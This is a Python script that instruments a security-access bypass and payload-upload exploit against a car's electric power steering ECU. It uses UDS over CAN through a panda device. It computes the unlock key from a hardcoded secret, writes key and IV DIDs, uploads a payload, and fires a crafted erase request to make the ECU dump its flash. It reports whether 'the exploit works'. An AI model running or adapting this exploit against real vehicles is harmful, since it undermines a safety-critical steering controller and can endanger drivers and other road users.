#!/usr/bin/env python3
"""Instrumented DataFlash dump: run the production dump flow step by step and record
everything — panda info, EPS identity DIDs, every UDS response and negative-response
code (NRC), and a full traceback on the failing step.

For triaging an unknown EPS (a car outside the Willem/Sienna family) where the plain
dump only shows "Dump failed." with no reason. Same UDS sequence, addresses, payload,
and timing as dump_dataflash.dump(); the only difference is per-step capture instead of
collapse-to-RetryError. It runs the real dump: if security access passes it uploads and
triggers the payload like production, with the collection window capped shorter.

The identity sweep also answers the standing "capture the EPS app-string every run"
item — the 8965B... part string that names the EPS variant.
"""
import hashlib
import struct
import subprocess
import time
import traceback as _tb
from pathlib import Path

from tsk.lib.env import is_agnos, DATAFLASH_PAYLOAD_PATH
from tsk.lib.extractor import NotAGNOSError, TSKExtractor
from tsk.lib.dump_dataflash import (
  ADDR, DUMP_START, DUMP_TOTAL, PAYLOAD_LOAD_ADDR, PAYLOAD_LOAD_SIZE,
  PAYLOAD_SHA256, TRIGGER_ADDR, TRIGGER_SIZE, RESPONSE_PENDING,
)

DIAG_COLLECT_SECONDS = 30.0   # shorter than the production 240s cap — a probe, not a full dump
DIAG_IDLE_TIMEOUT = 5.0

# TSKM talks UDS on bus 0 by default, but a car can route the EPS diagnostic onto a
# different panda bus number (the "swap" case). Probe these in order and run the whole
# flow on the first bus the EPS answers on; silence on all three is the routing signal.
CANDIDATE_BUSES = [0, 1, 2]

# EPS identity DIDs worth reading on an unknown ECU. The spare-part number (0xF187)
# and application SW id (0xF181) carry the 8965B... string that names the EPS variant;
# the rest add supplier / hardware / software detail. Each is read independently so one
# rejection doesn't stop the sweep.
IDENTITY_DIDS = [
  (0xF181, "app_sw_id"),
  (0xF187, "spare_part_no"),
  (0xF193, "supplier_hw_ver"),
  (0xF195, "supplier_sw_ver"),
  (0xF18C, "ecu_serial"),
  (0xF191, "mfr_ecu_hw_no"),
  (0xF18A, "supplier_id"),
  (0xF194, "supplier_sw_no"),
  (0xF180, "boot_sw_id"),
]


def _noop(**kwargs) -> None:
  pass


def _ascii(b: bytes) -> str:
  return "".join(chr(c) if 32 <= c < 127 else "." for c in b)


def diagnose(progress_cb=None) -> dict:
  """Run the dump flow with per-step instrumentation. Returns:
    {status, panda, identity[], steps[], failed_at, exception, traceback,
     frames, bytes, message}
  status is "dumped" | "no_frames" | "rejected" | "failed". Raises NotAGNOSError off-device.
  """
  if not is_agnos():
    raise NotAGNOSError

  cb = progress_cb or _noop

  from Crypto.Cipher import AES
  from opendbc.car.isotp import isotp_send
  from opendbc.car.structs import CarParams
  from opendbc.car.uds import UdsClient, ACCESS_TYPE, SESSION_TYPE, SERVICE_TYPE, \
    ROUTINE_CONTROL_TYPE, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError
  try:
    from opendbc.car.uds import _negative_response_codes as NRC_TABLE
  except Exception:
    NRC_TABLE = {}

  steps: list = []
  identity: list = []
  result = {
    "status": "failed", "panda": "", "eps_bus": -1, "identity": identity, "steps": steps,
    "failed_at": "", "exception": "", "traceback": "", "frames": 0, "bytes": 0,
    "message": "",
  }

  def record(name, ok, detail, t0) -> None:
    steps.append({"name": name, "ok": ok, "detail": detail, "ms": int((time.time() - t0) * 1000)})
    cb(steps=len(steps), last=name)

  def note_fail(name, exc) -> None:
    result["failed_at"] = name
    result["exception"] = f"{type(exc).__name__}: {exc}" if str(exc) else type(exc).__name__
    result["traceback"] = _tb.format_exc()

  def nrc(code) -> str:
    return f"NRC 0x{code:02x} {NRC_TABLE.get(code, 'unknown')}"

  def call(name, fn):
    """Run a critical UDS step. Records it; on failure records the NRC/traceback and
    returns (False, None) so the caller can stop the chain. Never re-raises."""
    t0 = time.time()
    try:
      val = fn()
      detail = val.hex() if isinstance(val, (bytes, bytearray)) else "ok"
      record(name, True, detail, t0)
      return True, val
    except NegativeResponseError as e:
      record(name, False, nrc(e.error_code), t0)
      note_fail(name, e)
      return False, None
    except Exception as e:
      record(name, False, f"{type(e).__name__}: {e}" if str(e) else type(e).__name__, t0)
      note_fail(name, e)
      return False, None

  # Kill the manager so pandad doesn't fight for the panda (mirrors dump()).
  subprocess.run(["pkill", "-9", "-f", "manager.py"], check=False)
  subprocess.run(["pkill", "-9", "-f", "pandad"], check=False)
  time.sleep(2)

  # Phase A: connect + panda info.
  t0 = time.time()
  try:
    panda = TSKExtractor._connect_panda()
    panda.set_safety_mode(CarParams.SafetyModel.elm327)
    try:
      ver = panda.get_version()
      ver = ver.decode(errors="replace") if isinstance(ver, (bytes, bytearray)) else str(ver)
    except Exception:
      ver = "unknown"
    result["panda"] = ver
    record("connect panda", True, f"fw {ver}", t0)
  except Exception as e:
    record("connect panda", False, f"{type(e).__name__}: {e}" if str(e) else type(e).__name__, t0)
    note_fail("connect panda", e)
    result["message"] = "No panda / connect failed. Check the harness."
    return result

  # Phase B: find the bus the EPS answers on. A negative response still means the EPS
  # is on that bus and talking; a timeout on all three is the routing/pin signal.
  eps_bus = None
  uds = None
  for cand in CANDIDATE_BUSES:
    t0 = time.time()
    probe = UdsClient(panda, ADDR, ADDR + 8, cand, timeout=0.2, response_pending_timeout=0.2)
    try:
      probe.diagnostic_session_control(SESSION_TYPE.DEFAULT)
      record(f"probe bus {cand} (default session)", True, "EPS responded", t0)
      eps_bus, uds = cand, probe
      break
    except NegativeResponseError as e:
      record(f"probe bus {cand} (default session)", True, f"EPS responded ({nrc(e.error_code)})", t0)
      eps_bus, uds = cand, probe
      break
    except Exception as e:
      record(f"probe bus {cand} (default session)", False,
             f"{type(e).__name__}: {e}" if str(e) else type(e).__name__, t0)
  result["eps_bus"] = eps_bus if eps_bus is not None else -1
  if uds is None:
    result["status"] = "rejected"
    result["message"] = ("EPS did not answer on bus 0, 1, or 2. The diagnostic channel is not on a "
                         "bus the panda reaches — a harness/routing issue, or the EPS is unpowered "
                         "in this car state.")
    return result
  time.sleep(0.5)

  call("session EXTENDED", lambda: uds.diagnostic_session_control(SESSION_TYPE.EXTENDED_DIAGNOSTIC))
  time.sleep(0.7)

  # Identity sweep — independent reads, never stops the run.
  for did, label in IDENTITY_DIDS:
    t0 = time.time()
    try:
      data = uds.read_data_by_identifier(did)
      identity.append({"did": f"0x{did:04x}", "name": label,
                       "hex": bytes(data).hex(), "ascii": _ascii(bytes(data))})
    except NegativeResponseError as e:
      identity.append({"did": f"0x{did:04x}", "name": label, "hex": "", "ascii": nrc(e.error_code)})
    except Exception as e:
      identity.append({"did": f"0x{did:04x}", "name": label, "hex": "",
                       "ascii": type(e).__name__})
  cb(steps=len(steps), last="identity")

  # Phase C: programming session (the step an out-of-family EPS often refuses).
  ok, _ = call("session PROGRAMMING", lambda: uds.diagnostic_session_control(SESSION_TYPE.PROGRAMMING))
  time.sleep(1.0)
  if not ok:
    result["status"] = "rejected"
    result["message"] = "EPS refused the programming session — the exploit can't proceed on this ECU."
    return result
  call("session PROGRAMMING (repeat)", lambda: uds.diagnostic_session_control(SESSION_TYPE.PROGRAMMING))

  # Phase D: security access — the key question. Record the seed and whether SEND_KEY
  # is accepted or rejected (NRC 0x35 invalid key / 0x33 access denied on a wrong secret).
  ok, seed = call("security REQUEST_SEED",
                  lambda: uds.security_access(ACCESS_TYPE.REQUEST_SEED, data_record=b"\x00" * 16))
  if not ok:
    result["status"] = "rejected"
    result["message"] = "EPS rejected the seed request."
    return result

  try:
    derived = AES.new(TSKExtractor.SEED_KEY_SECRET, AES.MODE_ECB).decrypt(b"\x00" * 16)
    sent_key = AES.new(derived, AES.MODE_ECB).encrypt(bytes(seed))
  except Exception as e:
    record("compute key", False, f"{type(e).__name__}: {e}", time.time())
    note_fail("compute key", e)
    result["message"] = "Key computation failed (unexpected seed shape)."
    return result

  ok, _ = call("security SEND_KEY", lambda: uds.security_access(ACCESS_TYPE.SEND_KEY, sent_key))
  if not ok:
    result["status"] = "rejected"
    result["message"] = ("EPS rejected the Willem key at security access — this ECU is not in "
                         "the exploit family (or uses a different secret).")
    return result

  # Phase E: payload upload (only reached if security passed — a surprise for a non-family car).
  payload = Path(DATAFLASH_PAYLOAD_PATH).read_bytes()
  sha_ok = hashlib.sha256(payload).hexdigest() == PAYLOAD_SHA256
  record("payload sha256", sha_ok, "match" if sha_ok else "MISMATCH", time.time())

  ok, _ = call("write DID 0x203", lambda: uds.write_data_by_identifier(0x203, b"\x00" * 5))
  if ok:
    call("write DID 0x201", lambda: uds.write_data_by_identifier(0x201, TSKExtractor.DID_201_KEY))
    call("write DID 0x202", lambda: uds.write_data_by_identifier(0x202, TSKExtractor.DID_202_IV))
    req = b"\x01\x46\x01\x00" + struct.pack("!I", PAYLOAD_LOAD_ADDR) + struct.pack("!I", PAYLOAD_LOAD_SIZE)
    up_ok, _ = call("request download",
                    lambda: uds._uds_request(SERVICE_TYPE.REQUEST_DOWNLOAD, data=req))
    if up_ok:
      chunk = 0x400
      xfer_ok = True
      for i in range(len(payload) // chunk):
        ok_i, _ = call(f"transfer_data {i + 1}",
                       lambda i=i: uds.transfer_data(i + 1, payload[i * chunk:(i + 1) * chunk]))
        if not ok_i:
          xfer_ok = False
          break
      if xfer_ok:
        call("transfer_exit", lambda: uds.request_transfer_exit())
        verify = b"\x45\x00" + struct.pack("!I", PAYLOAD_LOAD_ADDR) + struct.pack("!I", PAYLOAD_LOAD_SIZE)
        call("verify routine 0x10f0", lambda: uds.routine_control(ROUTINE_CONTROL_TYPE.START, 0x10f0, verify))

  # Phase F: trigger + collect (capped short). Report frames/bytes even if the chain
  # above had a soft failure — we want to see whether anything comes back.
  t0 = time.time()
  try:
    erase = b"\x31\x01\xff\x00" + b"\x45\x00" + struct.pack("!I", TRIGGER_ADDR) + struct.pack("!I", TRIGGER_SIZE)
    isotp_send(panda, erase, ADDR, bus=eps_bus)
    record("trigger erase", True, f"sent on bus {eps_bus}", t0)
  except Exception as e:
    record("trigger erase", False, f"{type(e).__name__}: {e}" if str(e) else type(e).__name__, t0)

  received = bytearray(DUMP_TOTAL)
  frames = 0
  covered = 0
  begin = time.time()
  last = begin
  while time.time() - begin < DIAG_COLLECT_SECONDS:
    progressed = False
    try:
      recv = panda.can_recv()
    except Exception:
      break
    for addr, *_, data, bus in recv:
      if bus != eps_bus or addr != ADDR + 8 or len(data) < 8 or data == RESPONSE_PENDING:
        continue
      ptr = (struct.unpack("<I", data[:4])[0] >> 8) & 0xFFFFFF
      off = ((DUMP_START & 0xFF000000) | ptr) - DUMP_START
      if off < 0 or off + 4 > DUMP_TOTAL:
        continue
      for k in range(off, off + 4):
        if received[k] == 0:
          received[k] = 1
          covered += 1
      frames += 1
      progressed = True
    if progressed:
      last = time.time()
    elif time.time() - last > DIAG_IDLE_TIMEOUT:
      break
    else:
      time.sleep(0.001)
    if covered >= DUMP_TOTAL:
      break

  record("collect", frames > 0, f"{frames} frames, {covered}/{DUMP_TOTAL} bytes", begin)
  result["frames"] = frames
  result["bytes"] = covered

  if covered >= DUMP_TOTAL:
    result["status"] = "dumped"
    result["message"] = "Full dump — the exploit works on this ECU."
  elif frames > 0:
    result["status"] = "no_frames"
    result["message"] = f"Security passed and the payload ran, but only {covered}/{DUMP_TOTAL} bytes came back."
  else:
    result["status"] = "no_frames"
    result["message"] = ("Security passed and the payload was uploaded, but the trigger produced no "
                         "dump frames. The exploit reached the EPS but did not execute as expected.")
  return result
